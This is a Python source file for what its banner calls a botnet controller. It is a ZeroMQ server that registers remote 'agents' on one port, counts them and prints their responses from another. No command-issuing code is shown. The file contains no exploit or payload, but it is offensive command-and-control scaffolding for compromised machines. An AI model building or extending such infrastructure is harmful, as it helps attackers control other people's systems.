import zmq
import os
import threading

ASCII_ART = r"""
     _       _ _               ______       _   _   _      _   
    | |     | | |              | ___ \     | | | \ | |    | |  
  __| |_ __ | | |_______ ______| |_/ / ___ | |_|  \| | ___| |_ 
 / _` | '_ \| | |_  / __|______| ___ \/ _ \| __| . ` |/ _ \ __|
| (_| | | | | | |/ / (__       | |_/ / (_) | |_| |\  |  __/ |_ 
 \__,_|_| |_|_|_/___\___|      \____/ \___/ \__\_| \_/\___|\__|

"""

connected_agents = set()  # set of connected agents
lock = threading.Lock() 

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(ASCII_ART)
    with lock:
        print(f"Connected agents: {len(connected_agents)} \n")

def handle_agent_registration():
    """Thread to handle agent registrations."""
    context = zmq.Context()
    reg_socket = context.socket(zmq.REP)  # REP for registration
    reg_socket.bind("tcp://*:9294")  # different port for registration
    while True:
        agent_id = reg_socket.recv_string()
        with lock:
            connected_agents.add(agent_id)  # Add agent to the connected set
        reg_socket.send_string("Registered")  # Acknowledge registration
        clear_screen()

def receive_responses():
    """Thread to handle incoming responses from agents."""
    context = zmq.Context()
    response_socket = context.socket(zmq.PULL)  # PULL for responses
    response_socket.bind("tcp://*:9293")  # different port for responses
    while True:
        response = response_socket.recv_string()
        print(f"\n[Response]\n{response}")

def main():
    # threads for agent connect and stdout
    threading.Thread(target=handle_agent_registration, daemon=True).start()
    threading.Thread(target=receive_responses, daemon=True).start()

    clear_screen()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Shutting down...")

if __name__ == "__main__":
    main()
